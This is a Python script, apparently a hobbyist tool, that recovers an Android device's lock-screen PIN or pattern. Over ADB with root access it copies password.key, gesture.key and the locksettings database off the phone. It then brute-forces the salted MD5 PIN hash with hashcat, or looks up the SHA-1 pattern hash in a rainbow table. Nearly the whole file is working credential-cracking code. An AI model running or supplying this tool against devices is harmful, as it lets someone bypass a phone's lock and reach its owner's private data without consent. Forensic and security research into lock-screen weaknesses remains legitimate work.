from dotenv import load_dotenv
import os, sys, sqlite3, time

print("=================================")
print("   Android PIN/Pattern Cracker   ")
print("         made by @D3vle0         ")
print("=================================\n")

load_dotenv(verbose=True)
ADB_PATH = os.getenv('ADB_PATH')
if not ADB_PATH:
    print("[-] Error: ADB_PATH not set")
    sys.exit(1)

os.system("rm locksettings.* &> /dev/null")
os.system("rm gesture.* &> /dev/null")
os.system("rm password.key &> /dev/null") 
os.system("rm out.txt &> /dev/null")

try: 
    uid = int(os.popen(f"{ADB_PATH} shell id").read().split("uid=")[1].split(" ")[0].split("(")[0])
except:
    print("[-] Error: No device found")
    sys.exit(3)

print("1. PIN Cracker\n2. Pattern Cracker")

try:
    main_ch = int(input("> "))
except KeyboardInterrupt:
    sys.exit(0)

if main_ch == 1:
    if uid:
        print("[-] No root access")
        sys.exit(3)
    pin_length = int(input("Enter PIN length (4~10): "))
    if pin_length < 4 or pin_length > 10:
        print("[-] Invalid PIN length")
        sys.exit(3)

    print("[+] connected to device")
    print("[+] collecting encrypted PIN data...\n")
    os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/password.key' > password.key")
    os.popen(f"{ADB_PATH} pull /data/system/locksettings.db .")
    os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-shm .")
    os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-wal .")
    time.sleep(3)
    conn = sqlite3.connect("locksettings.db")
    cur = conn.cursor()
    cur.execute("SELECT value from locksettings where name = 'lockscreen.password_salt'")
    salt = int(cur.fetchone()[0])
    print(f"[*] salt value in db: {salt}")
    time.sleep(1)
    md5_hash=open("password.key", "r").read()[40:].lower()
    print(f"[*] md5 hash: {md5_hash}")
    if salt > 0:
        calc_salt = hex(salt)[2:]
    else:
        calc_salt = hex((1 << 64) + int(salt))[2:]
    print(f"[*] calculated salt: {calc_salt}\n")

    print(f"[*] calculating hash...\n")
    syntax = ""
    for i in range(pin_length):
        syntax += "?d"
    os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 &> /dev/null")
    time.sleep((pin_length-3)*2)
    os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 --show > out.txt")
    try:
        pin = os.popen("cat out.txt").read().split("\n")[0].split(":")[2]
    except:
        print("[-] Error: Crack failed.")
        sys.exit(3)
    print(f'[+] cracked PIN: {pin}')

elif main_ch == 2:
    if uid:
        print("[-] No root access")
        sys.exit(3)
    print("[+] connected to device")
    print("[+] collecting encrypted pattern data...\n")
    os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/gesture.key' > gesture.key")
    time.sleep(1)
    sha1_hash = os.popen("xxd -p gesture.key").read()[:-1]
    print(f"[*] sha-1 encrypted data: {sha1_hash}")
    print("[+] searching in rainbow table...\n")
    conn = sqlite3.connect("GestureRainbowTable.db")
    cur = conn.cursor()
    cur.execute(f"SELECT pattern FROM RainbowTable WHERE hash = '{sha1_hash}'")
    pattern = cur.fetchall()[0][0]
    print(f"[+] cracked pattern: {pattern}")
    import json
    queue=json.loads(pattern)
    path=[0]*9
    for i in range(len(queue)):
        path[queue[i]]=i+1
    correct_answer = ""
    for i in range(9):
        if (i+1)%3:
            correct_answer += f"[{str(path[i])}] "
        else:
            correct_answer += f"[{str(path[i])}]\n\n"
    correct_answer = correct_answer[:-1]
    print(correct_answer)

